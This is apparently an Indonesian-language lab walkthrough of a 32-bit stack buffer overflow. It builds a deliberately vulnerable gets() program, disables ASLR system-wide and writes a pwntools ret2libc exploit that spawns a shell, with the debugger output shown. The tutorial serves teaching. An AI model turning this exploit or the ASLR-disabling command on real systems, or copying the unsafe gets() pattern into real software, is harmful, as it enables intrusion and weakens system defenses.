[x] NO Canary ~ -fno-stack-protector
[x] PIE ~ tanpa -no-pie
[x] NX ~ tanpa -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space

vuln_program.c

```c
#include<stdio.h>

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

kita kompile dengan cara seperti ini untuk supaya tidak ada perlindungan Canary

```bash
gcc -g -m32 -fno-stack-protector -o vuln32 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln32
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

```bash
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /root/You_Tube/Stack_Buffer_Overflow/3/vuln32 
give me your input :)  

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd638 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x41414641 ('AFAA')
ECX: 0xf7fb55c0 --> 0xfbad2288 
EDX: 0xf7fb689c --> 0x0 
ESI: 0xf7fb5000 --> 0x1d9d6c 
EDI: 0xf7fb5000 --> 0x1d9d6c 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd670 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffd670 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd674 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffd678 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffd67c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffd680 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffd684 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffd688 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffd68c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e199e0 <system>
gdb-peda$ print exit
$2 = {<text variable, no debug info>} 0xf7e0ca60 <exit>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f59aaa ("/bin/sh")
```

```python
from pwn import *
p=process('./vuln32')
print(p.recv())
padding = b'A'*52
system = p32(0xf7e199e0)
ret = p32(0xf7e0ca60)
param = p32(0xf7f59aaa)
p.sendline(padding+system+ret+param)
print(p.clean())
p.interactive()
```

```bash
$python3 exploit.py     
[+] Starting local process './vuln32': pid 25081
b'give me your input :)\n'
b'\n'
[*] Switching to interactive mode
$
```
